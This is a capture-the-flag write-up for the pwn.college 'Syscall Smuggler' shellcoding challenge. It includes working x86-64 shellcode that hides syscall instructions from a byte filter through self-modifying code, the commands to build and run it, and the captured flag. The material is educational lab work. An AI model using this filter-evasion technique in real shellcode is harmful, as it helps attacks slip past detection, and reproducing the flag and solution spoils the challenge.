---
Platform: Pwn College
Tittle: Syscall Smuggler
Date & Tme: 2026 - 10 - 22 20:09
tags:
  - Challenge
  - BinaryExploitation
  - ShellcodeInjection
  - Self-Modifying-Code
  - Syscall-Smuggling
  - Opcode-Filter
---
---
## FLAG : `{pwn.college{YKdDhbVzb-N9-ESc_zER121Rwy3.dFjMywiN4kDOyEzW}}`

---
## Solution :

The hint : 
> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

Program overview : 
```shell
hacker@program-security~syscall-smuggler:/challenge$ perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x90\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x54\x5e\x90\x90\x90\x97\x90\x31\xd2\x66\xba\xef\x0f\x90\x31\xc0\x0f\x05\x6a\x01\x5f\x90\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00"' | ./syscall-smuggler
###
### Welcome to ./syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x1b895000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Failed filter at byte 9!
```

The filter scans our input for:
- `0f 05` (`syscall`)
- `0f 34` (`sysenter`)
- `cd 80` / `80 cd` (`int 0x80`)

Standard `open` -> `read` -> `write` assembly code:
```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. open("/flag", 0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    mov rax, 2
    syscall             # not allowed: 0f 05

    # 2. read(fd, rsp, 0x100)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall             # not allowed: 0f 05

    # 3. write(1, rsp, count)
    mov rdx, rax        # rax holds bytes read from sys_read
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall             # not allowed: 0f 05

    # 4. exit(0)
    xor rdi, rdi
    mov rax, 60
    syscall             # not allowed: 0f 05

flag_path:
    .string "/flag"
```

Notice that the memory page for our shellcode is mapped **RWX** (`Mapped 0x1000 bytes for shellcode at 0x1b895000`). Because the buffer is writable at runtime, we can implement **Self-Modifying Code (SMC)** to smuggle the syscall instructions.

> [!info] Self-Modifying Code (SMC) via RIP-Relative Addressing
> The opcode for `syscall` is `0x0f 0x05`. Instead of placing `0x0f 0x05` statically, we can place `.byte 0x0e, 0x05`. This completely bypasses the filter because `0x0e 0x05` does not match `0x0f 0x05`.
> 
> Right before executing the byte, we run `inc byte ptr [rip]`. During execution, `[rip]` points to the immediate next instruction (`0x0e`). The CPU increments `0x0e` to `0x0f` in place, turning the bytes into `0x0f 0x05` (`syscall`) right before the instruction pointer reaches it.

Refined Assembly (`solve.s`):
```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. open("/flag", 0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 2. read(fd, rsp, 0x100)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 3. write(1, rsp, count)
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 4. exit(0)
    xor rdi, rdi
    mov rax, 60
    inc byte ptr [rip]
    .byte 0x0e, 0x05

flag_path:
    .string "/flag"
```

Payload Execution : 
```shell
gcc -nostdlib -static solve.s -o solve.elf
objcopy -O binary --only-section=.text solve.elf payload.bin
/challenge/syscall-smuggler < payload.bin
```

Result : 
```shell
hacker@program-security~syscall-smuggler:~/$ /challenge/syscall-smuggler < payload.bin
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x1b895000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000001b895000 | 48 8d 3d 58 00 00 00                          | lea rdi, [rip + 0x58]
0x000000001b895007 | 48 31 f6                                      | xor rsi, rsi
0x000000001b89500a | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x000000001b895011 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

pwn.college{YKdDhbVzb-N9-ESc_zER121Rwy3.dFjMywiN4kDOyEzW}
```

---
### Key Takeaways : 
- When memory is mapped **RWX**, we can modify instructions at runtime (**Self-Modifying Code**).
- `inc byte ptr [rip]` combined with `.byte 0x0e, 0x05` dynamically produces `0x0f 0x05` (`syscall`) in runtime memory without containing forbidden byte sequences statically.

---
## Related Concepts : 
[[Self-Modifying Code]], [[RIP-Relative Addressing]], [[Basic Shellcode]], [[Shellcode Database]], [[System Calls]], [[Assembly]], [[Assembly - Registers]], [[Assembly - Data Movement]]

